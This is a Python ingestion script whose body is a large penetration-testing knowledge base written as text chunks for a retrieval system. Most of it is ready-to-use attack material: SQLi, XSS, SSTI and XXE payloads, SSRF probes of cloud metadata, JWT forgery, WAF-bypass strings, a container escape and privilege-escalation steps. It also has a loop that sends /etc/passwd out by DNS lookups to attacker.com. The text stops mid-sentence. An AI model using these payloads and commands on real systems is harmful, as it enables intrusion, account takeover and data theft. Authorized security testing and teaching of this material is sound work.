"""
Ingest the elite cybersec system-prompt knowledge base + CySA+ concepts
into the RAG.

Run: python3 -m rag.ingest.knowledge
"""
from __future__ import annotations
import sys, textwrap
from pathlib import Path

RAG_DIR = Path(__file__).parent.parent


# ========================================================
# MASTER CYBERSEC KNOWLEDGE BASE
# (the comprehensive system-prompt condensed into chunks)
# ========================================================

PENTEST_KB: list[tuple[str, dict]] = []

def _kb(text: str, tags: list[str], category: str):
    PENTEST_KB.append((text.strip(), {
        "type":     "pentest_kb",
        "category": category,
        "tags":     ",".join(tags),
    }))


# -------- Recon --------
_kb("""
WEB RECON — Passive + Active Pipeline

PASSIVE:
  subfinder -d target.com -all -recursive | tee subfinder.txt
  amass enum -passive -d target.com | tee amass.txt
  curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
  gau --subs target.com | tee gau_urls.txt
  waybackurls target.com | tee wayback.txt
  katana -u target.com -jc -jsl -d 5 -kf all | tee katana.txt
  dnsx -l all_subs.txt -a -cname -resp | tee dnsx.txt   # Look for dangling CNAMEs
  trufflehog github --org=targetorg --only-verified       # Secret scanning

ASN + BGP (bgp.he.net):
  1. Search target domain on bgp.he.net → get ASN
  2. Enumerate IP ranges from ASN → mass scan
  3. Extract all subdomains + IPs registered under ASN
  4. Find shadow IT, staging, internal-facing infra exposed

ACTIVE:
  httpx -l all_subs.txt -title -tech-detect -status-code -follow-redirects
  nmap -sV -sC -p- --min-rate 5000 -oA nmap_full target.com
  rustscan -a target.com --ulimit 10000 -- -sV -sC
  feroxbuster -u https://target.com -w raft-large-words.txt -x php,asp,aspx,jsp,json,yaml,env -k
  nuclei -l live.txt -t technologies/ -silent
""", ["recon", "subdomain", "asn", "passive", "active"], "recon")

_kb("""
BGP.HE.NET — ASN to Full Attack Surface

1. Go to https://bgp.he.net → search company name or root domain
2. Get ASN number (e.g. AS12345)
3. From ASN page: download all prefixes (IP CIDRs)
4. From ASN page: see all associated domains / reverse DNS
5. Run httpx across all IPs → find internal admin panels, APIs, dev servers

Subdomain → sub-subdomain chain:
  subfinder -d target.com -all -recursive → all levels
  dnsx output → CNAME chains → subdomain takeover candidates
  cert.sh → wildcard certs → enumerate all covered names
  Shodan: org:"Target Corp" → find exposed infra NOT in DNS

Certificate transparency (crt.sh):
  curl "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
  Finds internal, staging, api, dev, admin subdomains often hidden from DNS
""", ["asn", "bgp", "recon", "subdomain", "crtsh", "shodan"], "recon")

# -------- OWASP Top 10 --------
_kb("""
OWASP A01 — Broken Access Control (IDOR / Privilege Escalation)

IDOR testing:
  - Change IDs: sequential, UUID swap, negative, large numbers
  - /api/user/ME/docs → /api/user/VICTIM_ID/docs
  - UUID v1 (timestamp-based) = predictable
  - Mass assignment: add role:admin, isAdmin:true to POST body
  - Parameter pollution: ?user_id=ME&user_id=VICTIM
  - Path traversal in ACL: /api/v1/admin/../user/profile
  - HTTP method switching: POST→PUT (may bypass ACL)
  - Content-type switching: JSON→form-encoded (parsers differ)

Vertical privilege escalation:
  - Admin endpoints callable without admin role
  - JWT: flip role claim, none alg, HS256 with public key
  - Response manipulation: {"admin":false} → true
  - Skip MFA: call /api/dashboard directly after /api/login
""", ["idor", "access-control", "privilege-escalation", "owasp-a01", "mass-assignment"], "owasp")

_kb("""
OWASP A02 — Cryptographic Failures

JWT attacks:
  1. Algorithm confusion: RS256 → HS256 with public key as HMAC secret
     python3 jwt_tool.py TOKEN -X k -pk public.pem
  2. None algorithm: {"alg":"none"} + remove signature
  3. Key confusion: sign with public key material
  4. Secret brute: hashcat -a 0 -m 16500 token.txt jwt-secrets.txt

TLS:
  testssl.sh --severity HIGH target.com
  sslscan --show-certificate target.com
  Look for: SSLv3/TLS1.0/1.1, weak ciphers, CRIME, BEAST, expired certs

Hardcoded secrets in JS:
  trufflehog filesystem ./downloaded_js/ --json
  gf aws-keys combined.js
  grep -rE "(api_key|secret|token|password)\\s*[:=]\\s*['\"][^'\"]{8,}" *.js

Weak randomness:
  - Collect 50+ session tokens, analyze for timestamp correlation
  - UUID v1 = predictable (timestamp-based)
  - Math.random() in Node.js is NOT cryptographically secure
""", ["jwt", "crypto", "tls", "secrets", "owasp-a02", "weak-crypto"], "owasp")

_kb("""
OWASP A03 — Injection (SQLi / XSS / SSRF / SSTI / XXE)

SQLi quick patterns:
  ' OR '1'='1   -- basic
  ' AND SLEEP(5)-- -   -- time-based blind
  LOAD_FILE(concat('\\\\',user(),'.attacker.com\\share'))-- -   -- OOB
  NoSQL: {"username": {"$gt": ""},"password": {"$gt": ""}}
  GraphQL: {users(filter:"1' OR '1'='1"){id email}}
  Second-order: inject in profile name, fire via search/export

  sqlmap -r request.txt --level=5 --risk=3 --technique=BEUSTQ

XSS advanced:
  DOM sinks: innerHTML, eval, document.write, location.href, dangerouslySetInnerHTML
  DOM sources: location.hash, location.search, document.referrer, window.name
  mXSS: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
  CSP bypass: JSONP endpoint, Angular template, base-uri, meta refresh
  XSS→ATO: steal cookie → change email → reset password

SSTI payloads:
  Jinja2:     {{7*7}}  {{config.__class__.__mro__[-1].__subclasses__()}}
  Twig:       {{7*'7'}} → '7777777'
  Freemarker: ${7*7}
  Smarty:     {$smarty.version}
  Velocity:   #set($x=7*7)${x}
  Mako:       ${7*7}

XXE vectors:
  SVG upload, DOCX/XLSX (unzip → word/document.xml), SAML assertions
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  OOB XXE: <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
""", ["sqli", "xss", "ssti", "xxe", "injection", "owasp-a03"], "owasp")

_kb("""
OWASP A07 — Authentication Failures

Password reset flaws:
  1. Token reuse (request 2 resets, use older token)
  2. Token brute (6-digit = 10^6 guesses, no rate limit)
  3. Host header injection → reset link to attacker domain
  4. Username case sensitivity (admin vs Admin vs ADMIN)
  5. Token not invalidated after use
  6. Token predictability (timestamp-based)

OAuth flaws:
  - state missing → CSRF on OAuth flow
  - redirect_uri: target.com.evil.com, path traversal, open redirect chain
  - Token in Referer header
  - Authorization code reuse (no PKCE)
  - scope escalation
  - Pre-hijack: register email before victim links OAuth → account takeover

MFA bypass:
  1. Response manipulation: mfa_required:true → false
  2. Skip step: call /dashboard after /login
  3. Backup codes brute (4-8 digit)
  4. TOTP ±30s window tolerance
  5. Backup phone/email exposed in API → takeover chain
""", ["auth", "oauth", "mfa", "password-reset", "owasp-a07", "ato"], "owasp")

# -------- SSRF --------
_kb("""
SSRF — Server-Side Request Forgery

Basic cloud metadata probes:
  AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GCP:   http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata:true"

SSRF bypass techniques:
  http://[::1]/                 IPv6 loopback
  http://127.0.0.1.nip.io/     DNS resolves to 127.0.0.1
  http://0x7f000001/            hex
  http://0177.0.0.1/            octal
  http://2130706433/            decimal
  http://evil.com@127.0.0.1/   URL parsing confusion
  DNS rebinding: attacker.com resolves to 127.0.0.1 after first request

Protocol smuggling:
  dict://127.0.0.1:6379/              Redis probing
  gopher://127.0.0.1:6379/_FLUSHALL  Redis command injection
  file:///etc/passwd                  LFI via SSRF
  ftp://127.0.0.1:21/                 FTP bounce

SSRF → RCE chain:
  1. SSRF → internal Redis → cache poison
  2. SSRF → internal admin panel → RCE via admin exec
  3. SSRF → cloud metadata → IAM credentials → privilege escalation
  4. SSRF → internal k8s API → pod exec

Where to look for SSRF:
  URL import, webhook callbacks, PDF generators, image resizers,
  "preview this link", XML/DOCX import, SVG → PDF conversion
""", ["ssrf", "imds", "cloud", "owasp-a10", "rce"], "owasp")

# -------- Business Logic --------
_kb("""
Business Logic Flaws

Checklist:
  □ Negative quantities in shopping carts → negative price
  □ Zero-price items, coupon stacking, promo code brute
  □ Race conditions on single-use codes (parallel redemption)
  □ Order state manipulation (skip payment → confirm)
  □ Mass assignment (price:0, role:admin in POST body)
  □ TOCTOU (check-then-act with race window)
  □ Workflow bypass (skip required API step)
  □ Account enumeration via error message timing
  □ Trust client-supplied data (discount_percent in POST)
  □ Multi-tenancy isolation (data leak between orgs)
  □ Feature flag bypass (call premium endpoint without subscription)
  □ API versioning: /api/v3 has fix but /api/v1 doesn't

Race conditions (Turbo Intruder / asyncio):
  import asyncio, httpx
  async def race(url, payload, n=20):
      async with httpx.AsyncClient() as c:
          tasks = [c.post(url, json=payload) for _ in range(n)]
          return await asyncio.gather(*tasks)
""", ["business-logic", "race-condition", "owasp-a04", "logic"], "owasp")

# -------- Non-obvious attack surface --------
_kb("""
Non-Obvious Attack Surfaces

HTTP Request Smuggling (CL.TE / TE.CL / H2.CL):
  - CL.TE: frontend uses Content-Length, backend uses Transfer-Encoding
  - H2.CL: Content-Length in HTTP/2 smuggled to HTTP/1.1 backend
  - Impact: poison next user, bypass auth, XSS via stolen requests

Cache Poisoning:
  Unkeyed headers: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
  Unkeyed params: utm_*, fbclid, _
  Web cache deception: /account/profile.css → caches user data

WebSocket hijacking (CSWSH):
  - No Origin check on WebSocket upgrade
  - Steal messages / execute commands in victim's session

Prototype pollution (JS):
  Object.prototype.__proto__ = {"isAdmin": true}
  Server-side PP (lodash/merge) → RCE in some versions
  Client-side PP → DOM XSS

CORS misconfiguration:
  null origin: <iframe sandbox="allow-scripts" src="data:...">
  Origin reflection: Access-Control-Allow-Origin: attacker.com
  Wildcard + credentials (spec violation)

Subdomain takeover:
  CNAME to dangling Heroku, GitHub Pages, Azure, Fastly, etc.
  NS to unregistered domain
  Check: subzy -targets subdomains.txt

Path traversal in cloud storage:
  Upload key: ../admin/config.php on S3 → overwrites

Unicode normalization:
  ℕ → N (some regex bypass)
  café vs café (precomposed vs decomposed)
  Homograph attacks on domain validation
""", ["smuggling", "cache-poison", "cors", "prototype-pollution", "websocket", "takeover"], "advanced")

# -------- Vuln chains --------
_kb("""
VULNERABILITY CHAINS — Critical Impact Combinations

Chain 1: Open Redirect → OAuth Token Theft (P1)
  1. /redirect?url=https://attacker.com (open redirect confirmed)
  2. Craft OAuth request with redirect_uri=/redirect?url=https://attacker.com
  3. Share link → victim authorizes → token/code hits attacker
  4. Exchange → account takeover

Chain 2: IDOR + Mass Assignment → Privilege Escalation (P1)
  1. IDOR: /api/users/UUID reveals another user
  2. PUT /api/users/UUID accepts role:admin (mass assignment)
  3. Combine → escalate any user to admin

Chain 3: SSRF + IMDS + IAM → Cloud Takeover (P1)
  1. SSRF via webhook/import/preview
  2. http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
  3. Exfil AWS key+secret+token
  4. enumerate-iam.py → find escalation path → full account

Chain 4: Stored XSS → ATO (P1)
  1. Stored XSS in name/bio/comment
  2. Extract admin session (if no HttpOnly)
  3. OR change admin email → trigger reset → takeover

Chain 5: Password Reset + Race Condition → ATO (P1)
  1. 6-digit numeric reset token, no rate limit
  2. 100 parallel requests with guesses
  3. One hits → reset victim password

Chain 6: Path Traversal + LFI → RCE (P1)
  1. /api/download?file=../../../../etc/passwd confirmed
  2. Read /proc/self/cmdline → app path
  3. Read .env → JWT_SECRET → forge admin JWT
  4. Admin JWT → code exec endpoint → RCE

Chain 7: JWT None Alg → Admin Bypass (P1)
  1. Decode JWT, change alg to none, role to admin
  2. Remove signature (keep trailing dot)
  3. Re-encode and submit → admin access

Chain 8: CORS + Stored XSS → Cross-origin ATO (P1)
  1. CORS reflects origin without validation
  2. XSS anywhere on origin → cross-origin API calls
  3. Read sensitive data / change account email → takeover
""", ["chain", "ato", "rce", "p1", "critical", "exploit-chain"], "exploit-chains")

# -------- Post-exploitation --------
_kb("""
POST-EXPLOITATION — Linux PrivEsc Checklist

Quick wins:
  id; whoami; hostname; uname -a
  sudo -l                                # What can we run as sudo?
  find / -perm -4000 -type f 2>/dev/null # SUID binaries
  find / -perm -2000 -type f 2>/dev/null # SGID
  getcap -r / 2>/dev/null                # Capabilities
  crontab -l; cat /etc/crontab           # Cron jobs
  env; cat ~/.bash_history               # Env vars + history
  cat /proc/self/environ                 # Process env

Writable paths:
  find / -writable -type d 2>/dev/null   # Writable dirs
  ls -la /etc/cron.*                     # Writable cron scripts?

Container escape:
  docker run --rm -v /:/mnt alpine chroot /mnt sh
  Check for: cap_sys_admin, /proc/sched_debug, /run/docker.sock

Data exfil (DNS):
  data=$(cat /etc/passwd|base64)
  for i in $(echo $data|fold -w 30); do dig $i.attacker.com; done
""", ["post-exploit", "privesc", "linux", "container", "exfil"], "post-exploit")

# -------- WAF bypass --------
_kb("""
WAF BYPASS TECHNIQUES

SQLi bypasses:
  SeLeCt UsErNaMe FrOm UsErS          -- case variation
  SEL/**/ECT/**/username/**/FROM/**/users  -- inline comments
  %2527 → %27 → '                     -- double URL encoding
  id=1e0 / id=1.0                      -- numeric notation
  SELE%43T                             -- partial URL encode

XSS bypasses:
  <svg onload=alert(1)>
  <img src=x onerror=alert(1)>
  <details open ontoggle=alert(1)>
  onerror="&#97;&#108;&#101;&#114;&#116;(1)"  -- HTML entities
  alert`1`                           -- backtick call
  <img src=x onerror=`${alert(1)}`>  -- template literal

Path traversal bypasses:
  ..%2F..%2Fetc%2Fpasswd
  ..%252F..%252F (double-encode)
  ....//....//etc/passwd (strip ../ leaves ../)
  ..%c0%af..%c0%af (Unicode overlong encoding)

Auth bypass headers:
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Original-URL: /admin/panel
  X-Rewrite-URL: /admin/panel
  X-Admin: true
  X-Role: admin
  X-User-ID: 1
  X-Debug: true
""", ["waf", "bypass", "encoding", "evasion", "xss", "sqli"], "evasion")

# -------- Cloud --------
_kb("""
CLOUD SECURITY — AWS Attack Paths

S3:
  aws s3 ls s3://target-bucket --no-sign-request
  aws s3api get-bucket-acl --bucket target
  aws s3api get-bucket-policy --bucket target
  Check: public read/write, no encryption, ACL vs object policy mismatch

SSRF to IMDS:
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  IMDSv2: TOKEN=$(curl -X PUT ".../token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
           curl .../meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

IAM PrivEsc paths:
  1. iam:PassRole + ec2:RunInstances → create EC2 with admin role
  2. lambda:CreateFunction + iam:PassRole → invoke as admin
  3. iam:CreatePolicy + iam:AttachUserPolicy → create+attach admin policy
  4. ssm:SendCommand → RCE on EC2 instances
  5. cloudformation:CreateStack with admin role in template

Enumeration with creds:
  enumerate-iam.py --access-key KEY --secret-key SECRET
  pacu (modular AWS exploitation)
  ScoutSuite (multi-cloud audit)
  prowler (CIS/compliance)

GCP:
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Firebase: test unauthenticated Firestore reads/writes

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata:true"
  Blob: az storage blob list --account-name acct --container-name pub --anonymous-auth
  MSOLSpray.py → password spray AAD
""", ["aws", "gcp", "azure", "cloud", "imds", "iam", "s3", "privesc"], "cloud")

# -------- API --------
_kb("""
API SECURITY — REST + GraphQL + gRPC

REST:
  API discovery: ffuf, feroxbuster, nuclei exposures/apis
  JS mining: katana + linkfinder
  Versioning: /api/v3 fixed → try /api/v1, /api/v2
  Verb tampering: OPTIONS exposes methods; TRACE sometimes enabled
  Mass assignment: add role:admin, is_staff:true to POST body
  Parameter pollution: ?id=1&id=2 (which wins? WAF vs backend differ)
  Content-type switch: JSON → form-urlencoded → bypass validation

GraphQL:
  Introspection: {"query": "{ __schema { types { name } } }"}
  Batch query abuse: [{query1},{query2},...] — rate limit bypass
  Alias abuse: {u1:user(id:1){email}, u2:user(id:2){email}}
  Field suggestion: {"query":"{ user { passwor } }"} → suggests password
  Directive injection: {user @skip(if: false) { password }}
  Introspection disabled? → clairvoyance tool for blind field enum

arjun / x8 for parameter discovery:
  arjun -u https://target.com/api/users
  x8 -u https://target.com/api/ -w params.txt

Mobile API surface:
  /m/, /mobile/, /app/ → often looser validation than web
  APK decompile → jadx → find baseUrl + endpoints
""", ["api", "graphql", "rest", "grpc", "mass-assignment", "parameter-pollution"], "api")

# -------- Improper Authentication (deep) --------
_kb("""
IMPROPER AUTHENTICATION — Generic (CWE-287) Deep Testing

Where it lives (server-side, never trust the client):
  Route/middleware layer, token verification, session validation,
  password-reset + email-change flows, refresh-token exchange,
  admin/privileged endpoints, API gateways.
  Common paths: /login /auth /api/authenticate /refresh-token
  /api/user/:id /admin /api/change-password /oauth/callback

Vulnerable code smells (grep for these):
  - Route reads req.params.id and queries DB with NO auth middleware
  - `if (token) { grant }` — presence check, no signature verify
  - jwt.decode(t, {verify_signature:false}) used for authZ decisions
  - session['user'] = username set WITHOUT password compare
  - Hardcoded `if user=='admin' && pass=='admin123'`
  - Missing rate-limit / lockout on the login + OTP + reset endpoints
  - alg:none accepted, or HS256 verified with RS256 public key
  - Authorization derived from a client-supplied header (X-User-Id)

Non-destructive test matrix (auth on YOUR authorized target only):
  1. Unauth access: GET protected endpoint with no token → expect 401/403
  2. Empty/garbage bearer: "Bearer ", "Bearer null", "Bearer undefined"
  3. JWT tamper: alg:none / role flip / RS256->HS256 confusion (jwt_tool.py)
  4. Horizontal (IDOR): swap own id for a second TEST account you control
  5. Step-up skip: hit /dashboard directly after /login pre-MFA
  6. Reset-token: reuse, no-expiry, host-header redirect, low entropy
  Validate with TWO accounts you own — prove A reads/acts as B.
  For blind/token-leak steps use an OOB collaborator, never a third party.

Impact ladder: unauth data read (High) < auth bypass to any account (Crit)
  < privilege escalation to admin (Crit). CVSS 9.x when full ATO.

Mitigation to cite in report: enforce auth middleware on every sensitive
  route; verify JWT signature + alg allowlist + aud/iss; server-side session
  validation w/ expiry + revocation; rate-limit & lockout on auth flows;
  object-level authZ (own the resource) not just authN.
""", ["auth", "improper-authentication", "cwe-287", "jwt", "idor", "ato", "owasp-a07"], "owasp")

# -------- Security Misconfiguration — sensitive file exposure --------
_kb("""
SECURITY MISCONFIGURATION — Sensitive File / Source Exposure (CWE-16/CWE-538)

Non-destructive detection = GET the path + confirm a CONTENT SIGNATURE
(a 200 with a login page is NOT a finding — match real content):
  .env / .env.production / .env.local  → signature: KEY=VALUE lines,
      DB_PASSWORD=, AWS_SECRET_ACCESS_KEY=, SECRET_KEY=
  .git/config + .git/HEAD              → signature: "[core]", "ref: refs/"
      then git-dumper to reconstruct source
  .DS_Store                            → directory listing leak
  wp-config.php(.bak/.old/~)           → DB_PASSWORD, AUTH_KEY defines
  web.config / appsettings.json        → connectionString, JwtSecret
  application.properties               → spring.datasource.password
  config.php / database.yml / settings → password/secret/api key
  docker-compose.yml / Dockerfile      → ENV secrets, POSTGRES_PASSWORD
  *.bak *.old *~ *.sql *.zip           → backups of the above
  *.pem *.key *.pfx *.p12              → private keys (BEGIN ... PRIVATE KEY)
  service-account.json                 → "type":"service_account" (GCP)
  /server-status /actuator/env /debug  → framework info + env dump

Per-stack hot files:
  Django : settings.py, local_settings.py, .env  (DEBUG=True leaks stack)
  Node   : .env, config/database.js, docker-compose.yml
  PHP/WP : wp-config.php*, config.php, .htpasswd
  Spring : application*.properties, /actuator/*, gradle.properties
  .NET   : web.config, appsettings*.json, App_Data/

What makes it VALID (not noise): the file returns real secret material
  (not a template/example), OR reconstructs source, OR the leaked cred is
  live. A .env.example with placeholders is informational at best.

Server-side fix to cite: block dotfiles + backup extensions at the web
  server; move secrets out of webroot; never commit .env/.git to the
  deploy artifact; rotate any exposed credential immediately.
""", ["misconfiguration", "env-exposure", "git-exposure", "source-leak", "secrets", "cwe-538", "owasp-a05"], "misconfig")

# -------- Subdomain & Bucket Takeover fingerprints --------
_kb("""
SUBDOMAIN & BUCKET TAKEOVER — Fingerprint + Validation (CWE-350)

Method: dnsx -cname over subdomains → find dangling CNAME → HTTP fetch →
  match provider "unclaimed" signature → confirm you can CLAIM the resource.
  Tools: subzy, nuclei -t takeovers/, dnsReaper. Cross-check can-i-take-over-xyz.

Provider fingerprints (CNAME target → body signature = candidate):
  *.github.io          "There isn't a GitHub Pages site here"
  *.herokuapp.com      "No such app" / default Heroku welcome
  *.netlify.app        "Site Not Found" / "Not Found - Request ID"
  *.vercel.app         "DEPLOYMENT_NOT_FOUND" / "NOT_FOUND"
  *.azurewebsites.net  "Web App - Unavailable" / 404 default
  *.s3.amazonaws.com   "NoSuchBucket"
  *.cloudfront.net     "Bad Request: ERROR: The request could not be..."
  *.pantheonsite.io    "The gods are wise" / 404 project
  *.zendesk.com        "Help Center closed" / no help center
  *.wordpress.com      "Do you want to register"
  *.ghost.io           "Domain error" / site not found
  *.fastly / *.readme.io / *.surge.sh / *.bitbucket.io  — provider-specific

VALIDATION (this is what separates real from theoretical):
  - Only report if the dangling target is genuinely CLAIMABLE by anyone
    (bucket free, app name free, Pages repo free). A parked/held name is N/A.
  - Prove control by claiming and serving a benign marker file at a path
    (e.g. /takeover-poc-<yourhandle>.txt). Never host malicious content.
  - NS-takeover (dangling NS to expired zone) = higher impact, whole subtree.

Severity: subdomain takeover on a trusted origin = High→Critical when the
  origin is used for auth cookies, OAuth redirect_uri, or CSP allowlist
  (chain: dangling redirect_uri → OAuth code theft → ATO).
""", ["subdomain-takeover", "bucket-takeover", "dangling-cname", "cwe-350", "takeover", "oauth-chain"], "advanced")

# -------- Cloud Storage exposure — multi-cloud enum --------
_kb("""
CLOUD STORAGE EXPOSURE — AWS / Azure / GCP / Oracle enumeration

Bucket-name candidate generation from the org/domain root <name>:
  <name> <name>-backup(s) <name>-assets <name>-uploads <name>-data
  <name>-prod <name>-dev <name>-staging <name>-media backup-<name>
  <name>-logs <name>-static <name>-public <name>-private
  (Azure account = lowercase, no dashes, <=24 chars)

Read-signatures (anonymous GET, then confirm real listing/objects):
  AWS S3   GET https://<b>.s3.amazonaws.com/          → <ListBucketResult><Key>
           aws s3 ls s3://<b> --no-sign-request
           write test: aws s3 cp x s3://<b>/ --no-sign-request  (PutObject ACL)
  GCP GCS  GET https://storage.googleapis.com/storage/v1/b/<b>/o → {"items":[..]}
           gsutil ls -r gs://<b>  (or public list JSON)
  Azure    GET https://<acct>.blob.core.windows.net/<c>?restype=container&comp=list
           → <EnumerationResults><Blob><Name>  (container ACL = public)
  Oracle   GET https://objectstorage.<region>.oraclecloud.com/n/<ns>/b/<b>/o
           → {"objects":[..]}

Triage what you find (impact = the data, not the open bucket):
  Rank objects by name: *backup* *dump* *.sql* *cred* *secret* *.pem*
  *config* *.env* *.bak* — those drive severity. An empty public bucket
  or public CDN assets meant to be public = Info/N-A.
  A public-WRITE bucket (PutObject/PutObjectAcl) is worse than read.

Chain: leaked bucket → JS bundle / backup → hardcoded AWS key → IMDS/IAM
  enum (enumerate-iam.py) → privilege escalation → account compromise.
""", ["cloud", "s3", "gcs", "azure-blob", "oracle-oci", "bucket-enum", "secrets", "owasp-a05"], "cloud")

# -------- JWT deep --------
_kb("""
JWT — Deep Analysis & Attack Matrix (CWE-347 / CWE-345)

Decode first (never trust, always inspect):
  jwt_tool.py <TOKEN>                 # full decode + automated checks
  echo <part> | base64 -d             # header / payload by hand
  Header: alg, kid, jku, x5u, jwk.  Claims: sub, role, aud, iss, exp, iat, nbf

Attack matrix:
  1. alg:none — {"alg":"none"} (also None/NONE/nOnE), drop signature, keep the
     trailing dot.  jwt_tool -X a
  2. Alg confusion RS256->HS256 — sign HS256 using the RSA PUBLIC key bytes as
     the HMAC secret.  jwt_tool -X k -pk public.pem
     (pubkey from /jwks.json, TLS cert, or recover w/ rsa_sign2n from 2 tokens)
  3. kid injection — kid used as path / SQL / command:
       kid: ../../../../dev/null  + sign with empty key
       kid: nonexistent';<sqli>-- -     kid: |id
     jwt_tool -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
  4. jku / x5u SSRF — point header URL at attacker-hosted JWKS you control,
     sign with your key; chains with URL allow-list bypass (OOB confirm).
  5. Embedded jwk — inject your own public key in the header (CVE-2018-0114).
  6. Weak HMAC secret brute:
       hashcat -a 0 -m 16500 token.txt jwt.secrets.list
       jwt_tool -C -d /path/wordlist
  7. Claim tamper (after any bypass above) — flip role/isAdmin/sub/tenant_id,
     extend exp, swap aud/iss for cross-service token reuse.
  8. Psychic signature — ES256/ECDSA with r=s=0 accepted (CVE-2022-21449).
  9. No verification at all — app decodes but never verifies: just edit+resend.
  10. exp/nbf not enforced — replay expired tokens; key-rotation/cache gaps.

Validate: prove identity/privilege change on YOUR test account (read an
  admin-only field, act as tenant B). jku/x5u = OOB host only.
Fix to cite: alg allowlist, verify server-side, validate aud+iss+exp, reject
  jku/x5u to untrusted hosts, high-entropy secret, rotate on leak.
""", ["jwt", "jws", "cwe-347", "alg-confusion", "kid-injection", "jku-ssrf", "auth", "owasp-a02"], "owasp")

# -------- JS recon: endpoint + secret mining --------
_kb("""
JAVASCRIPT RECON — Endpoint & Secret Mining from Bundles

Collect every JS in scope:
  katana -u https://target -jc -jsl -d 5 -o urls.txt
  cat urls.txt | grep -Ei '\\.js(\\?|$)' | httpx -mc 200 -o js.txt
  subjs -i live.txt | anew js.txt ; getJS --url URL ; gau '*.js'
  while read u; do wget -q "$u"; done < js.txt

Reconstruct real source (biggest win):
  For each app.js try app.js.map — if 200, unpack original modules:
    npx sourcemapper -url https://target/app.js.map -output src/
    unwebpack-sourcemap app.js.map     (or webcrack / react-source recovery)
  No map? deobfuscate: webcrack app.js > deobf.js ; js-beautify app.js

Mine endpoints:
  linkfinder -i app.js -o cli
  xnLinkFinder -i js.txt -sf target.com -o endpoints.txt
  grep -Eo '"/(api|v[0-9]|graphql|internal|admin)[^"]*"' *.js | sort -u
  Hunt: hidden/admin routes, unreleased features, internal APIs, GraphQL
  operation strings, upload + websocket URLs, deep-links.

Mine secrets / config:
  trufflehog filesystem ./js --only-verified
  secretfinder -i app.js -o cli ; gf aws-keys ; gf api-keys
  grep -EiI '(api[_-]?key|secret|token|bearer|firebase|apikey)["\\x27 :=]{1,4}[A-Za-z0-9_\\-\\.]{12,}' *.js
  Firebase config, Google Maps key, Sentry DSN, Stripe pk_/sk_, Algolia,
  Mapbox, Segment write key, hardcoded JWT, basic-auth in fetch().

Triage: pk_/Firebase apiKey/Sentry DSN are usually Info (client-side by
  design). sk_/service key/private token/DB creds = the finding. Verify live.
""", ["javascript", "js-recon", "source-map", "secrets", "endpoint-discovery", "webpack", "recon"], "recon")

# -------- JS function-level analysis --------
_kb("""
JAVASCRIPT FUNCTION-LEVEL ANALYSIS — Client-Side Logic & Sinks

Read the bundle for LOGIC, not just strings. After beautify/deobf:

Client-side access control (always bypassable — the finding is what it hides):
  grep -nEi 'is_?admin|role|isStaff|hasPermission|canAccess|featureFlag|beta|internal|debug' deobf.js
  A route/button gated only by `if(user.isAdmin)` -> call the API directly.
  Feature flag flipped in JS -> the backend endpoint often does NOT re-check.

Trace source -> sink (DOM XSS, function by function):
  Sources: location.hash/search/href, document.referrer, window.name,
    postMessage event.data, localStorage/sessionStorage, URLSearchParams
  Sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval,
    Function(), setTimeout(str), jQuery html()/$(), dangerouslySetInnerHTML,
    location=, .src=, script.text
  Follow the variable ACROSS functions; flag any reaching a sink unsanitized.

postMessage handlers (high value):
  grep -n 'addEventListener("message"' deobf.js
  Does it check event.origin? If not and event.data hits a sink or a
  privileged action (token relay, navigation, config write) -> exploitable.

Client-side auth/crypto handling:
  JWT in localStorage (XSS-stealable) vs httpOnly cookie? Hardcoded HMAC key
  for request signing? Custom auth header (X-Signature) you can reproduce?

Prototype pollution gadgets:
  grep -nE '\\[[^]]+\\]\\s*=|Object.assign|merge\\(|deepmerge|extend\\(' deobf.js
  A __proto__ sink reaching innerHTML/config/template -> PP -> XSS or RCE.

Known-vuln libs:  retire.js --js app.js   (old jQuery/Angular/lodash CVEs)
""", ["javascript", "dom-xss", "postmessage", "client-side", "prototype-pollution", "access-control", "advanced"], "advanced")

# -------- Per-request scope analysis --------
_kb("""
PER-REQUEST ANALYSIS — Methodical Scope Request Triage

Proxy everything (Burp/Caido). For EACH in-scope request, walk this grid:

Method + path:
  - Path IDs (numeric/UUID/slug) -> IDOR/BOLA: swap for a 2nd account's object
  - Verb tampering: GET<->POST, PUT/PATCH/DELETE, OPTIONS(methods), TRACE
  - Path normalization: //, /./, /..;/, %2e, trailing dot -> ACL bypass
  - API version pivot: /v2 fixed? try /v1 /v3 /internal /beta

Parameters (query + body):
  - Hidden params: arjun -u URL ; x8 -u URL -w params.txt ; param-miner
  - Mass assignment: add role/isAdmin/verified/price/user_id/tenant_id
  - Type juggle / array: id=1 -> id[]=1 ; {"id":{"$gt":0}} (NoSQL)
  - Parameter pollution: ?id=self&id=victim (front vs back parser differ)
  - Injection surfaces: sqli/ssti/xss/ssrf per field (mark reflected ones)

Headers + cookies:
  - Auth: drop token / empty / other user's / expired -> still works?
  - Custom X-* (X-User-Id, X-Forwarded-For, X-Original-URL, X-Debug) -> spoof
  - CORS: Origin: evil.com -> ACAO reflected + ACAC:true = credentialed read
  - Cookie flags (HttpOnly/Secure/SameSite), session fixation, JWT-in-cookie
  - Content-Type switch: JSON<->form<->multipart (parsers/validation differ)

Response signals (note, never skip):
  - Status/length/TIMING deltas -> auth oracle, user enum, blind injection
  - Reflected input -> XSS/injection candidate
  - Verbose errors / stack traces / internal host+IP -> info leak
  - Over-returned fields (other users' data, internal flags) -> BOLA/BOPLA
  - Cache headers on personalized data -> web cache deception

Discipline: one variable at a time, per-endpoint notes, rate-limit to the
